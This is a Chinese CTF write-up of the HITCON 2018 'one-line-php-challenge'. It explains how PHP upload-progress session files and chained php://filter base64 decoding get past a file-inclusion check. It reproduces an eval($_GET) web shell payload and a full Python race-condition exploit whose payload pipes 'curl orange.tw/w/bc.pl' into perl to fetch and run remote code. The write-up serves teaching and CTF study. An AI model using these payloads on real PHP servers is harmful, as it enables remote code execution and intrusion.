> 原文链接: https://www.anquanke.com//post/id/162656 


# 关于One-line-php-challenge的思考


                                阅读量   
                                **220055**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/dm/1024_576_/t0144db89bffad69e69.jpg)](https://p0.ssl.qhimg.com/dm/1024_576_/t0144db89bffad69e69.jpg)



## 0X01 前言：

hitcon 2018 过去了，作为一个 web 手 one-line-php-challenge 这道题自然引起了我的很大的兴趣，后期看各路大师傅们的解题姿势，也都是之前说过的一些细小的知识，看看为什么没有利用起来



## 0X02 题目介绍：

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/one-line%E9%A2%98%E7%9B%AE%E4%BB%8B%E7%BB%8D.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/one-line%E9%A2%98%E7%9B%AE%E4%BB%8B%E7%BB%8D.png)

```
P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04
```

不愧是 Orange 巨巨的题，真的惊了。

大概解释一下就是 我们要通过 get 方式传入一个 orange 参数，作为文件名，然后程序会将我们传入文件名的那个文件取出头6个字符和 @&lt;?php 比对，如果配对成功那么就会包含这个文件，否则就什么都不做

我们知道，这个比赛的 flag 开头是 hitcon 正好是6个字符，有没有关系呢？我们接着往下看



## 0X03 解题过程

### 第一步：实现 session 文件的创建

根据 Orange 给出的[解题思路](https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge)，我们首先要通过 PHP_SESSION_UPLOAD_PROGRESS 控制 session 文件（ 而且从官方文档我们能发现session_upload_progress.cleanup/enable是默认开启的 ，并且官方强烈推荐我们打开）

如下图所示：

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Progress%20enable%20default.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Progress%20enable%20default.png)

这一部分内容网上的很多文章也分析过了我就不重复分析了，但是这里却有一点不一样，人们根本没有向这个方向去想，因为这里面有一个误区，我们以前认为只有PHP使用了 session_start() 才会生成 session 文件，但是实际上并不是这样的

我们来看我下面的实验：

我在没有打开 session 的情况下，测试一段上传文件的代码，代码如下

tt.php

```
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
    &lt;form action="./upload.php" method="post" enctype="multipart/form-data"&gt;
     &lt;input type="hidden" name=&lt;?php echo ini_get('session.upload_progress.name');?&gt; value="K0rz3n" /&gt;
     &lt;input type="file" name="file" value = ""/&gt;
     &lt;input type="submit" name = "submit" value = "upload"/&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
```

upload.php

```
&lt;?php

if($_POST['submit'])`{`
    $raw_name1 = $_FILES['file']['name'];
    $temp_file1 = $_FILES['file']['tmp_name'];
    move_uploaded_file($temp_file1, './Uploads/'.$raw_name1);
`}`

?&gt;
```

实验一：无PHPSESSID的情况

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0PHPSESSID.gif)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0PHPSESSID.gif)

实验二：有PHPSESSID的情况

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9C%89PHPSESSID.gif)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9C%89PHPSESSID.gif)

实验三：只有PHPSESSID的情况

这次实验中我修改了 tt.php 中的部分内容，他看起来是下面的样子

```
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
    &lt;form action="./upload.php" method="post" enctype="multipart/form-data"&gt;
     &lt;input type="file" name="file" value = ""/&gt;
     &lt;input type="submit" name = "submit" value = "upload"/&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
```

我将不让 POST 请求中带有我们的 session.upload_progress.name

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0session.upload_processa.name.gif)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0session.upload_processa.name.gif)

我们发现，如果我们的请求头中带着 session.upload_progress.name 的值，不管服务端PHP有没有开session ，<br>
只要我们在请求头中填上 PHPSESSID(符合格式，随便你怎么写),服务器就会根据我们这个 PHPSESSID 在session 文件的默认存放位置生成一个 session 文件

### 第二步：再分析已知条件

好了，到现在为止我们再回过头看题目，根据我们上面的分析，是不是我们只要和原来的 session.upload_progress getshell 一样，向题目页面一边 POST 数据，然后再一边 GET 请求这个 session 文件就行了呢？我们发现事情并没有我们想的那么简单，我们发现 Orange 给我们做了一个非常苛刻的限制，这其实也是这道题的第二个难点，他要求文件的开头必须是 @&lt;?php ，这不是搞笑吗？ 我们来看一下这个 session 文件的内容，他是长得下面这个样子

```
upload_progress_K0rz3n|a:5:`{`s:10:"start_time";i:1540314711;s:14:"content_length";i:764161;s:15:"bytes_processed";i:5302;s:4:"done";b:0;s:5:"files";a:1:`{`i:0;a:7:`{`s:10:"field_name";s:6:"submit";s:4:"name";s:7:"tmp.gif";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1540314711;s:15:"bytes_processed";i:5302;`}``}``}`
```

可以看到这个文件是以 upload_progress 开头的,也就是说，我们包含还不能直接包含，我们还需要控制这个开头，但是最多控制这18个字符，如果超过了就会影响到我们的 payload ，导致 shell 无法创建

### 第三步：找到解决办法

这里又不得不提到 P 总，P 总在 2016 年的时候在博客提到过一个知识点，利用 PHP 的过滤器实现 绕过 死亡 &lt;?php exit;?&gt; 是对三个白帽的一道题的分析

我们先简单的回顾一下

题目内容是这样的：

```
&lt;?php
$content = '&lt;?php exit; ?&gt;';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);
```

大致意思是，我们可以在服务器上写文件，但是代码设置为只要我们传入文件的内容，他就给我们在开头添加上 &lt;?php exit;?&gt;，众所周知，这段代码的意思就是我们直接退出，不继续执行，因此就算我们传入了一句话，也会因为开头的这个退出指令导致我们无法包含，于是我们就要想办法绕过这个 “死亡” exit

P 总在文中给出了两种方法，一种是通过 php://filter 的 base64-decode 过滤器实现的，我们先简单看一下这个方法

#### 方法一：convert.base64-decode

这种方法涉及到了 php 进行 base64 解码的一种机制，他在解码的时候遇到不符合 base64 规定字符的就会将其忽略，实际上他的解码过程是这样的

```
&lt;?php
$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
base64_decode($_GET['txt']);
```

因此如果我们解码 &lt;?php exit; ?&gt; ，在排除掉 &lt; 、&gt; 、? 、；、空格以后，真正参与解码的只有 phpexit 这七个字符，又因为，base64 解码是 4byte 一组，于是我们给他添加一个字符让他凑够 8

测试代码：

```
&lt;?php 
echo base64_decode($_POST['b64']);
```

实验截图：

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/b64%E8%A7%A3%E7%A0%81.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/b64%E8%A7%A3%E7%A0%81.png)

那么现在只剩下这几个字符了，如果再解码一次估计就没剩什么了，自然我们就逃脱了 “死亡” exit

当然，我们能利用的不只是 base64 这一种过滤器，还有个过滤器叫 string.strip_tags,正如其名，他是用来去除 标签的

#### 方法二：string.strip_tags

测试代码：

```
&lt;?php 
echo strip_tags($_POST['tags']);
```

截图:

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/strip_tags.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/strip_tags.png)

这里不是我没运行，而是他已经把所有的标签连同里面内容全都删除了

但是如果是就这道 死亡 exit 来讲，这种方法也会将我们输入的shell 删除，解决办法就是使用过滤链，先将我们的 shell b64编码,然后经过 strip_tags 把 exit 去掉，然后在经过 b64 解码就 OK 了 ，具体的分析可以看 p总的[这篇文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

### 第四步：问题解决

经过上面的分析有没有觉得有了思路了呢？因为 Orange 这道题也是让我们逃逸,只不过不是 exit 而是 upload_progress 因为这个没有标签，于是 striptags 就不是很好用了，我们再看看 b64 的方法行不行<br>
，因为 upload_progress 是16个字符，但是根据 b64 的 decode 规则，其中只有14个字符能解析，但是 14个字符又不是 4 的整数倍，于是我们必须添加两个字符，将其变成16位，那么加什么字符合适呢？

这里面其实是有讲究的，必须要保证在加了这个字符以后每次 b64 可解码的位数都是4 的整数倍，要不然就会吞掉我们的 payload 想必是经历了一番 fuzz 找到了 ZZ 这两个字符

下面借用 wonderkun 师傅的脚本

```
&lt;?php
$i = 0 ;
$data = "upload_progress_ZZ";
while(true)`{`
    $i += 1;
    $data = base64_decode($data); 
    var_dump($data);
    sleep(1);
    if($data == '')`{`
        echo "一共解码了:".$i,"次n";
        break;
    `}`
`}`
```

所以我们的 payload 是下面这段代码的输出结果

```
&lt;?php

echo "upload_progress_ZZ".base64_encode(base64_encode(base64_encode('@&lt;?php eval($_GET[1]);')));
```

也就是

```
upload_progress_ZZVVVSM0wyTkhhSGRKUjFZeVdWZDNiMHBHT1VoU1ZsSmlUVll3Y0U5M1BUMD0=
```

我们亲自将去解码三次进行测试

测试代码：

```
&lt;?php

$data = 'upload_progress_ZZVVVSM0wyTkhhSGRKUjFZeVdWZDNiMHBHT1VoU1ZsSmlUVll3Y0U5M1BUMD0=';

for($i=0;$i&lt;3;$i++)`{`

    $new_data = base64_decode($data)."&lt;br/&gt;";
    echo $new_data;

    $data = $new_data;
`}`
```

输出结果：

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%89%E6%AC%A1%E8%A7%A3%E7%A0%81%E7%BB%93%E6%9E%9C1.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%89%E6%AC%A1%E8%A7%A3%E7%A0%81%E7%BB%93%E6%9E%9C1.png)

有一部分被解析了，我们看一下源码

[![](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%89%E6%AC%A1%E8%A7%A3%E7%A0%81%E7%BB%93%E6%9E%9C2.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%89%E6%AC%A1%E8%A7%A3%E7%A0%81%E7%BB%93%E6%9E%9C2.png)

可以看到我们成功恢复了我们的payload (&lt;br&gt;前面是上一次循环的，第三次循环只剩下了题目要求的字符)

下面给上 Orange 的 exp

```
import sys
import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool



HOST = 'http://54.250.246.238/'
sess_name = 'iamorange'

headers = `{`
    'Connection': 'close', 
    'Cookie': 'PHPSESSID=' + sess_name
`}`

payload = '@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;'


while 1:
    junk = ''.join(sample(string.ascii_letters, randint(8, 16)))
    x = b64encode(payload + junk)
    xx = b64encode(b64encode(payload + junk))
    xxx = b64encode(b64encode(b64encode(payload + junk)))
    if '=' not in x and '=' not in xx and '=' not in xxx:
        print xxx
        break

def runner1(i):
    data = `{`
        'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + xxx + 'Z'
    `}`
    while 1:
        fp = open('/etc/passwd', 'rb')
        r = requests.post(HOST, files=`{`'f': fp`}`, data=data, headers=headers)
        fp.close()

def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename
    # print filename
    while 1:
        url = '%s?orange=%s' % (HOST, filename)
        r = requests.get(url, headers=headers)
        c = r.content
        if c and 'orange' not in c:
            print

if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)
```



## 0X04 总结：

这篇文章在看了 wonderkun 师傅的分析后又简单的跟着 Orange 的提供的思路走了一遍题目的流程，没有新的技术，但是更多的是技术的细节，session.upload_progress 这个小细节之前我也没有想到过，很多的细节就在想当然中过去了，如果你深入挖掘一下，可能会有不一样的收获



## 0X05 参考：

[http://wonderkun.cc/index.html/?p=718](http://wonderkun.cc/index.html/?p=718)

[https://www.leavesongs.com/PENETRATION/php-filter-magic.html](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

[https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge](https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge)
